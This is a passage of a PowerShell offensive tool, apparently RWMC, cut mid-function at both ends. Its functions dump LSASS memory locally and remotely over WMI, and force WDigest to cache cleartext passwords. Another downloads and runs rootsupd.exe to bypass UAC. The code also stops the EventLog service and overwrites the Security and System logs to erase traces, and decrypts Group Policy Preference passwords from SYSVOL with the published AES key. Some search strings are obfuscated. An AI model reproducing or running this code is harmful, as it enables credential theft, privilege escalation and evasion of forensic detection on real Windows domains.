    foreach ($member in $global:groupMembers[$group]) {         
        foreach ($parent in $parents) { 
            if ($member -eq $parent) {                 
                Write-Host "Circular nested group found $parent"
                #Write-Log -streamWriter $global:streamWriter -infoToLog "Circular nested group found $parent"
                $global:circularGroupNumber = $global:circularGroupNumber + 1                 
                Return 
            } 
        }                   
        if ($global:groupMembers.ContainsKey($member)) {
            $parrentArrayRecurse = $parents 
            Get-Nesting $member ($parrentArrayRecurse += $member) 
        }
 
    } 
} 

function Get-DomainsColor {
    if($ADForest -ne "") {
        $forest = Get-ADForest -Identity $ADForest
    }
    else {
        $currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name
        $forest = Get-ADForest -Identity $currentDomain
          
    }    	
    return $forest
}

function Scan-ServicePrincipalName {
<#
.SYNOPSIS
    LDAP queries to locate service principal name in a domain
    Author: Pierre-Alexandre Braeken (@pabraeken)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION
    Scan-ServicePrincipalName allows to locate service principal name in a domain. The output of this function is a list of SPNs of the type selected.

.PARAMETER Type
    Int parameter that let you specify the SPN type you want to query in the domain.

.EXAMPLE
    C:\PS> Scan-ServicePrincipalName -Type $type
#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Type,
        [String]
        [ValidateNotNullOrEmpty()]
        $Domain
    )      
    
   # $domainDistinguishedName = ([ADSI]'').distinguishedName    # (Get-ADDomain).DistinguishedName    
   # $domainControllerToQuery = ([ADSI]"LDAP://RootDSE").dnshostname
    
    $LDAPObject = New-Object System.DirectoryServices.DirectorySearcher([ADSI]("LDAP://$Domain" ))
    $filter = "(servicePrincipalName=$Type*)" 
    $propertiesToLoad = "name","distinguishedName,objectCategory,servicePrincipalName"
    $scope = "subtree" 
    $pageSize = 1000 
    $LDAPQuery = Set-LDAPQuery $LDAPObject $filter $propertiesToLoad $scope $pageSize
    $results = $LDAPQuery.FindAll() 
    
    "There are " + $results.count + " SPNs"
    
    foreach($result in $results) {
        $userEntry = $result.GetDirectoryEntry()
        Write-Output "Object Name = " $userEntry.name
        Write-Output "DN      =      "  $userEntry.distinguishedName
        Write-Output "Object Cat. = "  $userEntry.objectCategory
        Write-Output "servicePrincipalNames"
        $i=1
        foreach($SPN in $userEntry.servicePrincipalName) {
            Write-Output "SPN($i)=$SPN"
            $i++
        }
        Write-Output ""
    }         
}

function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
<#
.SYNOPSIS
    Set a setting in the registry
    Author: Pierre-Alexandre Braeken (@pabraeken)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None 

.DESCRIPTION
    Set-RegistryKey allows for the configuration of a registry setting

.PARAMETER computername

.PARAMETER parentKey

.PARAMETER nameRegistryKey

.PARAMETER valueRegistryKey
    
.EXAMPLE
    C:\PS> Set-RegistryKey "Server1" "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" "LocalAccountTokenFilterPolicy" "1"
#>
    try{    
        $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
        $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
        $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
        $remoteBaseKeyObject.close()
    }
    catch {
        $_.Exception
    }
}

function Disable-UAC($computername) {
    $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
    $nameRegistryKey = "LocalAccountTokenFilterPolicy"
    $valueRegistryKey = "1"

    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computername)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $computername $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function CreateDirectoryIfNeeded ( [string] $directory ) {
	if (!(Test-Path -Path $directory -type "Container")) {
		New-Item -type directory -Path $directory > $null
	}
}

function Set-SymbolServer {              
    $cacheDirectory = "$windowsSecurity\SYMBOLS\PUBLIC"     
    $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
    $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
    CreateDirectoryIfNeeded -directory $cacheDirectory
    $env:_NT_SYMBOL_PATH = $envPath    
}

function Write-Minidump ($process, $dumpFilePath) {
    $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')    
    $flags = [Reflection.BindingFlags] 'NonPublic, Static'
    $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))        
        if(!$result) {
            Write-Host "Error : cannot dump the process" -ForegroundColor Red
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception()       
        Write-Host "Error : cannot dump the process" -ForegroundColor Red
        $fileStream.Close()
        Stop-Script 
    }
    $fileStream.Close()       
}

function Write-MiniDumpDBGHelp ($process, $dumpFilePath){
    $MethodDefinition = @'
[DllImport("DbgHelp.dll", CharSet = CharSet.Unicode)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess,
    uint processId,
    IntPtr hFile,
    uint dumpType,
    IntPtr expParam,
    IntPtr userStreamParam,
    IntPtr callbackParam
    );
'@

    $dbghelp = Add-Type -MemberDefinition $MethodDefinition -Name 'dbghelp' -Namespace 'Win32' -PassThru

    $miniDumpWithFullMemory = [UInt32] 2

    $processId = $process.Id
    $processName = $process.Name
    $processHandle = $process.Handle
    $processFileName = "$($processName).dmp"

    $processDumpPath = "$dumpFilePath\$processFileName"

    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
    try{
        $result = $dbghelp::MiniDumpWriteDump($processHandle,$processId,$fileStream.SafeFileHandle.DangerousGetHandle(),$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
        if(!$result) {
            Write-Host "Error : cannot dump the process" -ForegroundColor Red
            $fileStream.Close()
            Stop-Script
        }
    }
    catch{
        $_.Exception.Message
        Write-Host "Error : cannot dump the process" -ForegroundColor Red
        $fileStream.Close()
        Stop-Script
    }
    $fileStream.Close()
}

function Run-WmiRemoteProcess {
    Param(
        [string]$computername=$env:COMPUTERNAME,
        [string]$cmd=$(Throw "You must enter the full path to the command which will create the process."),
        [int]$timeout = 0
    )
 
    Write-Output "Process to create on $computername is $cmd"
    [wmiclass]$wmi="\\$computername\root\cimv2:win32_process"
    # Exit if the object didn't get created
    if (!$wmi) {return}
 
    try{
    $remote=$wmi.Create($cmd)
    }
    catch{
        $_.Exception
    }
    $test =$remote.returnvalue
    if ($remote.returnvalue -eq 0) {
        Write-Output ("Successfully launched $cmd on $computername with a process id of " + $remote.processid)
    } else {
        Write-Output ("Failed to launch $cmd on $computername. ReturnValue is " + $remote.ReturnValue)
    }    
    return
}

function Remote-Dumping($computername, $scriptPath, $logDirectoryPath) {
    Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
    $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
    Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp"
    Start-Sleep -Seconds 15
    Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
    Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
    Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
    Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
}

function Set-WdigestProvider {
    $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
        New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
        Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        $valueSetted = (Get-ItemProperty -Path  $parentKey  -Name $nameRegistryKey).$nameRegistryKey
        if($valueSetted -ne 1) {
            New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null
            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Set-RemoteWdigestProvider ($server) {
    $parentKey = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
    $nameRegistryKey = "UseLogonCredential"
    $valueRegistryKey = "1"
    $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
    $objRegKey= $objReg.OpenSubKey($parentKey)
    $test = $objRegkey.GetValue($nameRegistryKey)
    if($test -eq $null){    
        Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
        Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
        Stop-Script
    }
    else {
        if($test -ne 1){
            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
            Stop-Script
        }
    }
}

function Write-InFile ($buffer, $chain) {
    [io.file]::WriteAllText($buffer, $chain) | Out-Null
}

function Call-MemoryWalker ($memoryWalker, $file, $fullScriptPath) {
    if($mode -eq "2016") {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" -y "$scriptPath\misc\symbols2016TP3"
    }
    else {
        $tab = &$memoryWalker -z $file -c "`$`$<$fullScriptPath;Q" 
    }
    return $tab
}

function Clean-String ($tab, $matches, $snapshot) {    
    if($snapshot -eq $true) {$toAdd = 8;$chain="Implicit"}
    else {if($snapshot -eq "kernel") {$toAdd = 7;$chain="Implicit"}
        else {$toAdd = 0;$chain = White-Rabbit42}}
    $tabA = ($tab -split ' ')     
    if($mode -eq 132) { 
        $start = 20
        $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
        $foundT = $tabA[$fi]      
        $found = "$foundT"   
    }   
    else {
        if($mode -eq 232) {             
            $fi = [array]::indexof($tabA,$chain) + 7 + $toAdd
            $foundT = $tabA[$fi]      
            $found = "$foundT"   
        }   
        else {
            $fi = [array]::indexof($tabA,$chain) + 10 + $toAdd
            $found1 = $tabA[$fi]    
            $fi = [array]::indexof($tabA,$chain) + 11 + $toAdd
            $found2 = $tabA[$fi]    
            $found = "$found2$found1"   
        }
    }
    return $found
}

function Stop-Script () {   
    Begin{
        #Write-Log -streamWriter $global:streamWriter -infoToLog "--- Script terminating ---"
    }
    Process{        
        "Script terminating..." 
        Write-Output "================================================================================================"
        #End-Log -streamWriter $global:streamWriter       
        Exit
    }
}

function Test-InternetConnection {
    if(![Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet){
        Write-Output "The script need an Internet Connection to run"
        Stop-Script
    }
}

function Test-IsInLocalAdministratorsGroup {
    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name    
    $group = Get-CimInstance -ClassName Win32_Group  -Filter "Name = 'Administrators'"    
    $administrators = Get-CimAssociatedInstance -InputObject $group -ResultClassName Win32_UserAccount | select -ExpandProperty Caption         
    if ($administrators -notcontains $me) {
        $false
    }
    else {
        $true
    }
}

function Test-LocalAdminRights {
    $myComputer = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
    $myUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $amIAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent())
    $adminFlag = $amIAdmin.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if($adminFlag -eq $true){
        $adminMessage = " with administrator rights on " 
    }
    else {
        $adminMessage = " without administrator rights on "
    }

    Write-Host "RWMC runs with user " -nonewline; Write-Host $myUser.Name -f Red -nonewline; Write-Host $adminMessage -nonewline; Write-Host $myComputer -f Red -nonewline; Write-Host " computer"
    return $adminFlag
}

function Set-ActiveDirectoryInformations ($adFlag) {
    if (((gwmi win32_computersystem).partofdomain -eq $true) -and ($adFlag -eq 1)) {
        $global:partOfADomain = 1
        Import-Module activedirectory 
        if (Get-Module -ListAvailable -Name activedirectory) {
            Import-Module activedirectory
        } else {
            Write-Output "Module activedirectory does not exist, importing..."
            Import-Module ServerManager 
            Add-WindowsFeature RSAT-AD-PowerShell        
        }    
        $enterpriseAdminsGroup = "Enterprise Admins"
        $schemaAdminsGroup = "Schema Admins"
        $domainAdminsGroup = "Domain Admins"
        $administratorsGroup = " Administrators"
        $backupOperatorsGroup = "Backup Operators"    
        $global:enterpriseAdmins = ""
        $global:schemaAdmins = ""
        $global:domainAdmins = ""
        $global:administrators = ""
        $global:backupOperators = ""
        try {$global:enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
        try {$global:administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
        try {$global:backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
    }
}
function Bypass-UAC ($scriptPath, $logDirectoryPath) {               
    $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
    $fileDownloaded = "$logDirectoryPath\rootsupd.exe" 
     
    $webClient = new-object System.Net.WebClient 
    $webClient.DownloadFile($fileToDownload, $fileDownloaded)              

    &$fileDownloaded "/C:C:\Windows\System32\cmd.exe /C $scriptPath\msdsc.exe lsass $logDirectoryPath Title (launch the script from here, you are admin now)"    
}

function Post-HttpRequest($url,$parameters) { 
    $httpRequest = New-Object -ComObject Msxml2.XMLHTTP 
    $httpRequest.open("POST", $url, $false) 
    $httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
    $httpRequest.setRequestHeader("Content-length", $parameters.length); 
    $httpRequest.setRequestHeader("Connection", "close") 
    $httpRequest.send($parameters) 
    $httpRequest.responseText 
}

function Stop-Activities () {
    $eventLogDependancies = (get-service EventLog).dependentservices
    foreach ($dependance in $eventLogDependancies){
        Stop-Service $dependance -Force
    }
    Get-Service eventlog | Set-Service -StartupType disabled 
    Stop-Service eventlog -force
    #$global:serviceToStop = Get-WmiObject -Class Win32_Service -Filter "Name='EventLog'"
    #$global:serviceToStop.StopService() | Out-Null        
}

function Clear-Activities ($scriptPath) {    
    Copy-Item -Path "$scriptPath\misc\Microsoft-Windows-PowerShell%4Operational.evtx" -Destination "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx"
    Copy-Item -Path "$scriptPath\misc\Application.evtx" -Destination "C:\Windows\System32\winevt\Logs\Application.evtx"
    Copy-Item -Path "$scriptPath\misc\System.evtx" -Destination "C:\Windows\System32\winevt\Logs\System.evtx"
    Copy-Item -Path "$scriptPath\misc\Security.evtx" -Destination "C:\Windows\System32\winevt\Logs\Security.evtx"
    Get-Service eventlog | Set-Service -StartupType Automatic
    Start-Service eventlog
    #$global:serviceToStop.StartService() | Out-Null
}

function Get-OperatingSystemMode ($operatingSystem, $osArchitecture) {
    if($operatingSystem -eq "5.1.2600" -or $operatingSystem -eq "5.2.3790"){
        $mode = 3
    }
    else {
        if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
            if($osArchitecture -like "64*") {
                $mode = 1
            }
            else {
                $mode = 132
            }
        }
        else {
            if($operatingSystem -eq "6.2.9200"){
                $mode = 2
            }
            else{
                if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240"){        
                    if($osArchitecture -like "64*") {  
                        if($operatingSystem -eq "6.3.9600"){
                            $mode = "8.1"       
                        }       
                        else {
                            $mode = "2r2"
                        }
                    }
                    else {
                        $mode = "232"
                    }
                }
                else {
                    if ($operatingSystem -eq "10.0.10514" -or $operatingSystem -eq "10.0.10586" -or $operatingSystem -eq "10.0.11082" -or $operatingSystem -eq "10.0.14342" -or $operatingSystem -eq "10.0.14372"){
                         $mode = "2016"
                    }
                    else {
                        Write-Output "The operating system could not be determined... terminating..."
                        Stop-Script 
                    }
                }
            }
        }
    }
    return $mode
}
 Function LoadColorList {
    $sRGBList = @()
    $sRGBList += "rgb(0, 0, 0)"# -sName "Black"
    $sRGBList += "rgb(0, 0, 128)"# -sName "Navy"
    $sRGBList += "rgb(0, 100, 0)"# -sName "DarkGreen"    
    $sRGBList += "rgb(139, 0, 0)"# -sName "DarkRed"
    $sRGBList += "rgb(148, 0, 211)"# -sName "DarkViolet"
    $sRGBList += "rgb(255, 20, 147)"# -sName "DeepPink"
    $sRGBList += "rgb(0, 206, 209)"# -sName "DarkTurquoise"
    $sRGBList += "rgb(139, 0, 139)"# -sName "DarkMagenta"
    $sRGBList += "rgb(173, 255, 47)"# -sName "GreenYellow"
    $sRGBList += "rgb(240, 230, 140)"# -sName "Khaki"
    $sRGBList += "rgb(255, 250, 240)"# -sName "FloralWhite"
    $sRGBList += "rgb(255, 255, 0)"# -sName "Yellow"
    $sRGBList += "rgb(255, 160, 122)"# -sName "LightSalmon"
    $sRGBList += "rgb(255, 165, 0)"# -sName "Orange"
    $sRGBList += "rgb(255, 215, 0)"# -sName "Gold"
    $sRGBList += "rgb(128, 128, 0)"# -sName "Olive"
    $sRGBList += "rgb(92, 92, 92)"# -sName "Grey"
    $sRGBList += "rgb(135, 206, 235)"# -sName "SkyBlue"
    return $sRGBList
}

function Set-FormulaToShapeAndChildren($shape,$cell,$formula) {
    $shape.CellsU($cell).FormulaU = $formula
    foreach ($subShape in $shape.Shapes) {
    $subShape.CellsU($cell).FormulaForceU = $formula
        foreach ($subShape2 in $subShape.Shapes) {
            $subShape2.CellsU($cell).FormulaForceU = $formula
        }
    }
}
function Get-DecryptMyPassword {
    Param  (
    [Parameter(Position=0,mandatory=$true)]    
    [ValidateNotNullOrEmpty()] 
    [String] $cPassword
    )

    try{
        $mod=($cPassword.length % 4)
        if($mod -ne 0) {
            $pad = "=" * (4 - ($cPassword.Length % 4))
        }
        $base64Decoded = [Convert]::FromBase64String($cPassword + $pad)

        <# 
            https://msdn.microsoft.com/en-us/library/cc422924.aspx?f=255&MSPPError=-2147217396
            All passwords are encrypted using a derived Advanced Encryption Standard (AES) key.<3>
            The 32-byte AES key is as follows:
            4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
            f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
        #>

        $AESObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [byte[]] $AESKey = @(0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 
                            0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 
                            0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b)
        $AESIV = New-Object byte[]($AESObject.IV.Length)
        $AESObject.IV = $AESIV
        $AESObject.Key = $AESKey
        $decryptorObject = $AESObject.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($base64Decoded, 0 , $base64Decoded.Length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($outBlock)
    }
    catch {
        Write-Error "$error[0]"
    }
}

function Convert-ByteArrayToString{
 [CmdletBinding()] Param (
 [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [System.Byte[]] $ByteArray,
 [Parameter()] [String] $Encoding = "ASCII" )

    switch ( $Encoding.ToUpper() ) {
        "ASCII" { $EncodingType = "System.Text.ASCIIEncoding" }
        "UNICODE" { $EncodingType = "System.Text.UnicodeEncoding" }
        "UTF7" { $EncodingType = "System.Text.UTF7Encoding" }
        "UTF8" { $EncodingType = "System.Text.UTF8Encoding" }
        "UTF32" { $EncodingType = "System.Text.UTF32Encoding" }
        Default { $EncodingType = "System.Text.ASCIIEncoding" }
    }
    $Encode = new-object $EncodingType
    $ByteArray = $Encode.GetString($ByteArray)
    return $ByteArray
}

function Set-FileSystemSecurity {
	[cmdletbinding()] Param(
	[Parameter(Mandatory = $True, ValueFromPipeline = $True)] $SecurityFiles,
	[Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $BaseUrl,
	[Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $Directory )
	$wClient = New-Object System.Net.WebClient
	foreach($file in $files){
        $url = "$BaseUrl" + "/" + "$file"
		$wClient.DownloadFile("$url","$Directory\$file")        
	}
}

function Set-Upload{
	[cmdletbinding()] Param(
	[Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $Mode)

	Switch ($Mode) {
	    "2r2" {
    		    $files = @("SymbolCheck.dll","cdb.exe","dbghelp.dll","symsrv.dll")
    		    Set-FileSystemSecurity -BaseUrl $baseUrl2r2 -SecurityFiles $files -Directory $windowsSecurity
	    }
	    "pre2r2" {
    		    $files = @("SymbolCheck.dll","cdb.exe","dbghelp.dll","symsrv.dll")
    		    Set-FileSystemSecurity -BaseUrl $baseUrlpre2r2 -SecurityFiles $files -Directory $windowsSecurity
	    }
	    "pre2r2vm" {
    		    $files = @("SymbolCheck.dll","cdb.exe","dbghelp.dll","symsrv.dll","dbgeng.dll")
    		    Set-FileSystemSecurity -BaseUrl $baseUrlpre2r2vm -SecurityFiles $files -Directory $windowsSecurity
		    if(!(Test-Path $winXpPath)) {
    			    New-Item $winXpPath -type directory | Out-Null
		    }
		    $files = @("kdexts.dll","ks.dll","nvkd.dll")
    		    Set-FileSystemSecurity -BaseUrl $baseUrlpre2r2vm -SecurityFiles $files -Directory "$windowsSecurity\winxp"
	    }
    }
}
function Get-GPPPassword {  
    [CmdletBinding()]
        Param (
            [string] $Domain 
        )       
    Set-StrictMode -Version 2
    
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )
            
        $Mod = ($Cpassword.length % 4)
            
        switch ($Mod) {
        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        '2' {$Cpassword += ('=' * (4 - $Mod))}
        '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)                    
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
                    
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)        
    }
    
    function Get-InfoFromXML {
    [CmdletBinding()]
        Param (
            $File 
        )                
        $fileName = Split-Path $File -Leaf
        [xml] $xml = Get-Content ($File)

        $cpassword = @()
        $userName = @()
        $newName = @()        
        $password = @()
        $toSecureHash = @{}
            
        if ($xml.innerxml -like "*cpassword*"){                            
            switch ($fileName) {
                'Groups.xml' {
                    $cpassword += , $xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $newName += , $xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}                    
                }        
                'Services.xml' {  
                    $cpassword += , $xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}                    
                }        
                'Scheduledtasks.xml' {
                    $cpassword += , $xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}                    
                }        
                'DataSources.xml' { 
                    $cpassword += , $xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/DataSources/DataSource/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}                    
                }                    
                'Printers.xml' { 
                    $cpassword += , $xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/Printers/SharedPrinter/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}                    
                }
                'Drives.xml' { 
                    $cpassword += , $xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    $userName += , $xml | Select-Xml "/Drives/Drive/Properties/@userName" | Select-Object -Expand Node | ForEach-Object { $_.Value }                    
                }
            }
        }                     
        foreach ($toDecrypt in $cpassword) {            
            $decryptedPassword = Get-DecryptedCpassword $toDecrypt                        
            $password += , $decryptedPassword
        }                    
        if (!([string]::IsNullOrEmpty($password))) {                          
            $toSecureHash = @{'Passwords' = $password;
                                    'UserNames' = $userName;                                    
                                    'NewName' = $newName;
                                    'File' = $File}
        }        

        $gpp = New-Object -TypeName PSObject -Property $toSecureHash        
        IF(!([string]::IsNullOrEmpty($gpp))) {         
            #Write-Log -streamWriter $global:streamWriter -infoToLog "File: $($gpp.File)"            
            #Write-Log -streamWriter $global:streamWriter -infoToLog "UserNames: $($gpp.UserNames)"
            #Write-Log -streamWriter $global:streamWriter -infoToLog "NewName: $($gpp.NewName)"
            #Write-Log -streamWriter $global:streamWriter -infoToLog "Passwords: $($gpp.Passwords)"   
        }
        else {
            #Write-Log -streamWriter $global:streamWriter -infoToLog "File: $xmlFile (nothing)"
        }         
    }           
    if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
        #Write-Log -streamWriter $global:streamWriter -infoToLog "Not member of a domain'"
        throw 'Not member of a domain'
    }
            
    if(Test-Path "\\$domain\SYSVOL"){
        $xmlToCheck = Get-ChildItem -Path "\\$domain\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'    
        if ( -not $xmlToCheck ) {            
            #Write-Log -streamWriter $global:streamWriter -infoToLog "No preference files found"            
        }
        foreach ($xmlFile in $xmlToCheck) {
            Write-Output $dncfad
            $gpp = (Get-InfoFromXML $xmlFile.Fullname)            
        }
    }
    else {
       #Write-Log -streamWriter $global:streamWriter -infoToLog "Unable to access the directory \\$domain\SYSVOL" 
    }
}
function Call-MemoryKernelWalker ($kd, $file, $fullScriptPath, $symbols) {    
    $tab = &$kd -kl -y $symbols -c "`$`$<$fullScriptPath;Q"  
    return $tab
}

function White-Rabbit {
	
}

function Clear-Chain ($chain) {
    $string = ""
    foreach ($c in $chain) {
        $string += $c        
    }
    return $string
}

function White-Rabbit1 {
    $chain = (("1*31&1*31&1*1&1*11&1*32&1*18&1*32&1*24&1*33&1*34&1*14&1*35&1*36&1*15&1*32&1*37&1*15&1*38"-split "&")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121"-split "T")[$matches[2]])"*$matches[1]}})
    $chain = Clear-Chain ($chain)
    return $chain
}

function White-Rabbit42 {
